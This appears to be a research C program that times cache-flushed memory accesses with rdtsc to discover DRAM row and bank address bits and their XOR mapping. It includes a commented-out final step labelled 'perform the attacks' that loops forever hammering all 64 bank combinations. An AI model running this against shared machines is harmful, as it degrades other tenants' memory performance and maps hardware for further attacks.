#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <inttypes.h>
#include <fcntl.h>
#include <time.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <sys/resource.h>


#define ROUND_NR 1000000

/* This uses (cache_flush+access) to realize the uncached access */

void cache_flush(uint8_t *address) {
        __asm__ volatile("clflush (%0)": :"r"(address) :"memory");
        return;
}

uint64_t rdtsc(void) {
        uint64_t a, d;
        __asm__ volatile ("rdtsc" : "=a" (a), "=d" (d));
        return (d<<32) | a;
}

int main(int argc, char* argv[]) {
	uint8_t *mem_chunk = NULL;
	uint64_t mem_size = 1024*1024*1024;
	int fd = open("/mnt/hugepages/nebula1", O_CREAT|O_RDWR, 0755);
	
	if (fd < 0) {
		printf("file open error!\n");
		return 0;
	}
	mem_chunk = mmap(0, mem_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (mem_chunk == MAP_FAILED) {
		printf("map error!\n");
		unlink("/mnt/hugepages/nebula1");
		return 0;
	}

	int i, j;
	for (i=0; i<mem_size/sizeof(uint8_t); i++)
		mem_chunk[i] = 1;

	int bit, offset;
	volatile uint8_t next = 0;;
	uint64_t start, end;


/**********************Setp1: identify the row indexes (longer time)*****************************/
	for (bit=6; bit<30; bit++) {
		offset = (1<<bit)/sizeof(uint8_t);

		start = rdtsc();
		for (i=0; i<ROUND_NR; i++) {
			cache_flush(&mem_chunk[0]);
			next += mem_chunk[0];
			cache_flush(&mem_chunk[offset]);
			next -= mem_chunk[offset];
		}
		end = rdtsc();

		printf("Bit %d: %lu cycles\n", bit, (end - start));
	}


/**********************Setp2: identify the bank indexes (shoter time)*****************************/
/*	for (bit=1; bit<30; bit++) {
		offset = ((1<<23) + (1<<bit))/sizeof(uint8_t);

		start = rdtsc();
		for (i=0; i<ROUND_NR/2; i++) {
			next += mem_chunk[0];
			cache_flush(&mem_chunk[0]);
			next -= mem_chunk[offset];
			cache_flush(&mem_chunk[offset]);
		}
		end = rdtsc();

		printf("Bit %d: %lu cycles\n", bit, (end - start));
	}

*/

/**********************Setp3: identify the XOR relation*****************************/
/*	int bank_index[6];

	bank_index[0] = 6;
	bank_index[1] = 7;
	bank_index[2] = 15;
	bank_index[3] = 16;
	bank_index[4] = 20;
	bank_index[5] = 21;

	int bit1, bit2;
	for (bit1=0; bit1<5; bit1++) {
		for (bit2=bit1+1; bit2<6; bit2++) {
			offset = ((1<<bank_index[bit1]) + (1<<bank_index[bit2]))/sizeof(uint8_t);
			start = rdtsc();
			for (i=0; i<ROUND_NR/2; i++) {
				next += mem_chunk[0];
				cache_flush(&mem_chunk[0]);
				next -= mem_chunk[offset];
				cache_flush(&mem_chunk[offset]);
			}
			end = rdtsc();
			printf("Bit %d XOR %d: %lu cycles\n", bank_index[bit1],bank_index[bit2], (end - start));
		}
	}
*/

/**********************Setp3: perform the attacks*****************************/
/*	int access_index[64];

	for (i=0; i<64; i++) {
		access_index[i] = (((i>>5)&0x1)<<bank_index[5])/sizeof(uint8_t) +
				  (((i>>4)&0x1)<<bank_index[4])/sizeof(uint8_t) +
				  (((i>>3)&0x1)<<bank_index[3])/sizeof(uint8_t) +
				  (((i>>2)&0x1)<<bank_index[2])/sizeof(uint8_t) +
				  (((i>>1)&0x1)<<bank_index[1])/sizeof(uint8_t) +
				  (((i>>0)&0x1)<<bank_index[0])/sizeof(uint8_t);
	}

	while (1) {
		for (j=0; j<64; j++) {
				next += mem_chunk[access_index[j]];
				cache_flush(&mem_chunk[access_index[j]]);
		}
	}
*/
	return 0;
}
